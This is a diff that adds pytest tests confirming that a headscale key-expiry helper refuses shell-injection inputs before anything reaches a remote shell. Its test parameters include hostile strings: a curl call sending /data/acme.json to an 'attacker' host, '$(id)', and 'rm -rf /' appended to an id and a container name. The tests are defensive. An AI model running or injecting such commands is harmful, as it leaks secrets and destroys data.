@@ -133,6 +133,39 @@ class TestTalkingToTheServer:
         assert "--force" in command
         assert "--id 20" in command
 
+    @pytest.mark.parametrize(
+        "bad_id",
+        ["20; curl attacker/?k=$(cat /data/acme.json)", "$(id)", "1 && rm -rf /", "", "abc"],
+    )
+    def test_a_non_numeric_id_is_refused_before_it_reaches_a_shell(self, mocker, bad_id) -> None:
+        """Raised in review of #1353.
+
+        The CLI is safe because it matches ids against headscale's own output, but
+        this function is importable and interpolates the argument into a string a
+        remote shell runs. The guard belongs where the string is built, not where
+        today's only caller happens to be careful — and this call MUTATES, unlike
+        the listing that shares the pattern.
+        """
+        run = mocker.patch("toolkit.features.secret_expiry.subprocess.run")
+        with pytest.raises(ValueError, match="must be numeric"):
+            expire_headscale_preauthkey("deployer@vps", bad_id)
+        run.assert_not_called()
+
+    def test_an_unsafe_container_name_is_refused(self, mocker) -> None:
+        run = mocker.patch("toolkit.features.secret_expiry.subprocess.run")
+        with pytest.raises(ValueError, match="unsafe container"):
+            expire_headscale_preauthkey("deployer@vps", "20", container="head; rm -rf /")
+        run.assert_not_called()
+
+    def test_the_guard_is_a_raise_not_an_assert(self) -> None:
+        """Assertions vanish under `python -O`; a guard an interpreter flag can
+        switch off is not a guard."""
+        import inspect
+
+        src = inspect.getsource(expire_headscale_preauthkey)
+        assert "raise ValueError" in src
+        assert "assert " not in src
+
     def test_a_failed_expiry_raises(self, mocker) -> None:
         mocker.patch(
             "toolkit.features.secret_expiry.subprocess.run",
